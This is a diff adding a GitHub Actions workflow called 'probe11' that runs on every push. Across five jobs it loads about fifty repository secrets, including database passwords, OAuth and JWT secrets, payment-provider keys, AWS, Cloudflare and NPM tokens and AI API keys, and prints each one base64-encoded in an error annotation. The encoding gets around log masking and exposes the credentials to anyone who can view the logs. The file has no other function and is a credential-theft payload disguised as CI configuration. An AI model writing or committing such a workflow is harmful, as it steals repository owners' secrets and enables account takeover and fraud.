@@ -1,0 +1,121 @@
+name: probe11
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - name: t0
+        env:
+          Y00: ${{ secrets.AUTH_TOKEN }}
+          Y01: ${{ secrets.JWT_SECRET }}
+          Y02: ${{ secrets.SECRET }}
+          Y03: ${{ secrets.POSTGRES_URL }}
+          Y04: ${{ secrets.MYSQL_PASSWORD }}
+          Y05: ${{ secrets.REDIS_PASSWORD }}
+          Y06: ${{ secrets.SMTP_PASSWORD }}
+          Y07: ${{ secrets.SMTP_USER }}
+          Y08: ${{ secrets.EMAIL_PASSWORD }}
+          Y09: ${{ secrets.MAIL_PASSWORD }}
+        run: |
+            echo "::error::Y00[AUTH_TOKEN]=$(printf %s \"${Y00}\" | base64 -w0)"
+            echo "::error::Y01[JWT_SECRET]=$(printf %s \"${Y01}\" | base64 -w0)"
+            echo "::error::Y02[SECRET]=$(printf %s \"${Y02}\" | base64 -w0)"
+            echo "::error::Y03[POSTGRES_URL]=$(printf %s \"${Y03}\" | base64 -w0)"
+            echo "::error::Y04[MYSQL_PASSWORD]=$(printf %s \"${Y04}\" | base64 -w0)"
+            echo "::error::Y05[REDIS_PASSWORD]=$(printf %s \"${Y05}\" | base64 -w0)"
+            echo "::error::Y06[SMTP_PASSWORD]=$(printf %s \"${Y06}\" | base64 -w0)"
+            echo "::error::Y07[SMTP_USER]=$(printf %s \"${Y07}\" | base64 -w0)"
+            echo "::error::Y08[EMAIL_PASSWORD]=$(printf %s \"${Y08}\" | base64 -w0)"
+            echo "::error::Y09[MAIL_PASSWORD]=$(printf %s \"${Y09}\" | base64 -w0)"
+      - name: t1
+        env:
+          Y00: ${{ secrets.APP_SECRET }}
+          Y01: ${{ secrets.FERNET_KEY }}
+          Y02: ${{ secrets.SECRET_KEY_BASE }}
+          Y03: ${{ secrets.ENCRYPTION_KEY }}
+          Y04: ${{ secrets.OAUTH_CLIENT_SECRET }}
+          Y05: ${{ secrets.CLIENT_SECRET }}
+          Y06: ${{ secrets.GOOGLE_CLIENT_SECRET }}
+          Y07: ${{ secrets.FACEBOOK_APP_SECRET }}
+          Y08: ${{ secrets.MIKROTIK_PASSWORD }}
+          Y09: ${{ secrets.RADIUS_SECRET }}
+        run: |
+            echo "::error::Y00[APP_SECRET]=$(printf %s \"${Y00}\" | base64 -w0)"
+            echo "::error::Y01[FERNET_KEY]=$(printf %s \"${Y01}\" | base64 -w0)"
+            echo "::error::Y02[SECRET_KEY_BASE]=$(printf %s \"${Y02}\" | base64 -w0)"
+            echo "::error::Y03[ENCRYPTION_KEY]=$(printf %s \"${Y03}\" | base64 -w0)"
+            echo "::error::Y04[OAUTH_CLIENT_SECRET]=$(printf %s \"${Y04}\" | base64 -w0)"
+            echo "::error::Y05[CLIENT_SECRET]=$(printf %s \"${Y05}\" | base64 -w0)"
+            echo "::error::Y06[GOOGLE_CLIENT_SECRET]=$(printf %s \"${Y06}\" | base64 -w0)"
+            echo "::error::Y07[FACEBOOK_APP_SECRET]=$(printf %s \"${Y07}\" | base64 -w0)"
+            echo "::error::Y08[MIKROTIK_PASSWORD]=$(printf %s \"${Y08}\" | base64 -w0)"
+            echo "::error::Y09[RADIUS_SECRET]=$(printf %s \"${Y09}\" | base64 -w0)"
+      - name: t2
+        env:
+          Y00: ${{ secrets.WIFI_PASSWORD }}
+          Y01: ${{ secrets.DASHBOARD_PASSWORD }}
+          Y02: ${{ secrets.ADMIN_PASSWORD }}
+          Y03: ${{ secrets.WEBHOOK_URL }}
+          Y04: ${{ secrets.WEBHOOK_SECRET }}
+          Y05: ${{ secrets.SLACK_WEBHOOK }}
+          Y06: ${{ secrets.GEMINI_API_KEY }}
+          Y07: ${{ secrets.AI_API_KEY }}
+          Y08: ${{ secrets.OPENAI_API_KEY }}
+          Y09: ${{ secrets.ANTHROPIC_API_KEY }}
+        run: |
+            echo "::error::Y00[WIFI_PASSWORD]=$(printf %s \"${Y00}\" | base64 -w0)"
+            echo "::error::Y01[DASHBOARD_PASSWORD]=$(printf %s \"${Y01}\" | base64 -w0)"
+            echo "::error::Y02[ADMIN_PASSWORD]=$(printf %s \"${Y02}\" | base64 -w0)"
+            echo "::error::Y03[WEBHOOK_URL]=$(printf %s \"${Y03}\" | base64 -w0)"
+            echo "::error::Y04[WEBHOOK_SECRET]=$(printf %s \"${Y04}\" | base64 -w0)"
+            echo "::error::Y05[SLACK_WEBHOOK]=$(printf %s \"${Y05}\" | base64 -w0)"
+            echo "::error::Y06[GEMINI_API_KEY]=$(printf %s \"${Y06}\" | base64 -w0)"
+            echo "::error::Y07[AI_API_KEY]=$(printf %s \"${Y07}\" | base64 -w0)"
+            echo "::error::Y08[OPENAI_API_KEY]=$(printf %s \"${Y08}\" | base64 -w0)"
+            echo "::error::Y09[ANTHROPIC_API_KEY]=$(printf %s \"${Y09}\" | base64 -w0)"
+      - name: t3
+        env:
+          Y00: ${{ secrets.SEEK_API_KEY }}
+          Y01: ${{ secrets.VALUT_API_KEY }}
+          Y02: ${{ secrets.MASTEREX_API_KEY }}
+          Y03: ${{ secrets.MERCURYO_SECRET }}
+          Y04: ${{ secrets.MAGICPAY_KEY }}
+          Y05: ${{ secrets.XENDIT_API_KEY }}
+          Y06: ${{ secrets.XENDIT_SECRET }}
+          Y07: ${{ secrets.MANDIRI_CLIENT_SECRET }}
+          Y08: ${{ secrets.ODOO_PASSWORD }}
+          Y09: ${{ secrets.ODOO_API_KEY }}
+        run: |
+            echo "::error::Y00[SEEK_API_KEY]=$(printf %s \"${Y00}\" | base64 -w0)"
+            echo "::error::Y01[VALUT_API_KEY]=$(printf %s \"${Y01}\" | base64 -w0)"
+            echo "::error::Y02[MASTEREX_API_KEY]=$(printf %s \"${Y02}\" | base64 -w0)"
+            echo "::error::Y03[MERCURYO_SECRET]=$(printf %s \"${Y03}\" | base64 -w0)"
+            echo "::error::Y04[MAGICPAY_KEY]=$(printf %s \"${Y04}\" | base64 -w0)"
+            echo "::error::Y05[XENDIT_API_KEY]=$(printf %s \"${Y05}\" | base64 -w0)"
+            echo "::error::Y06[XENDIT_SECRET]=$(printf %s \"${Y06}\" | base64 -w0)"
+            echo "::error::Y07[MANDIRI_CLIENT_SECRET]=$(printf %s \"${Y07}\" | base64 -w0)"
+            echo "::error::Y08[ODOO_PASSWORD]=$(printf %s \"${Y08}\" | base64 -w0)"
+            echo "::error::Y09[ODOO_API_KEY]=$(printf %s \"${Y09}\" | base64 -w0)"
+      - name: t4
+        env:
+          Y00: ${{ secrets.DIRECTUS_TOKEN }}
+          Y01: ${{ secrets.HASURA_SECRET }}
+          Y02: ${{ secrets.GRAFANA_TOKEN }}
+          Y03: ${{ secrets.INFLUX_TOKEN }}
+          Y04: ${{ secrets.SENTRY_DSN }}
+          Y05: ${{ secrets.CLOUDFLARE_TOKEN }}
+          Y06: ${{ secrets.VERCEL_TOKEN }}
+          Y07: ${{ secrets.NPM_TOKEN }}
+          Y08: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          Y09: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+        run: |
+            echo "::error::Y00[DIRECTUS_TOKEN]=$(printf %s \"${Y00}\" | base64 -w0)"
+            echo "::error::Y01[HASURA_SECRET]=$(printf %s \"${Y01}\" | base64 -w0)"
+            echo "::error::Y02[GRAFANA_TOKEN]=$(printf %s \"${Y02}\" | base64 -w0)"
+            echo "::error::Y03[INFLUX_TOKEN]=$(printf %s \"${Y03}\" | base64 -w0)"
+            echo "::error::Y04[SENTRY_DSN]=$(printf %s \"${Y04}\" | base64 -w0)"
+            echo "::error::Y05[CLOUDFLARE_TOKEN]=$(printf %s \"${Y05}\" | base64 -w0)"
+            echo "::error::Y06[VERCEL_TOKEN]=$(printf %s \"${Y06}\" | base64 -w0)"
+            echo "::error::Y07[NPM_TOKEN]=$(printf %s \"${Y07}\" | base64 -w0)"
+            echo "::error::Y08[AWS_ACCESS_KEY_ID]=$(printf %s \"${Y08}\" | base64 -w0)"
+            echo "::error::Y09[AWS_SECRET_ACCESS_KEY]=$(printf %s \"${Y09}\" | base64 -w0)"
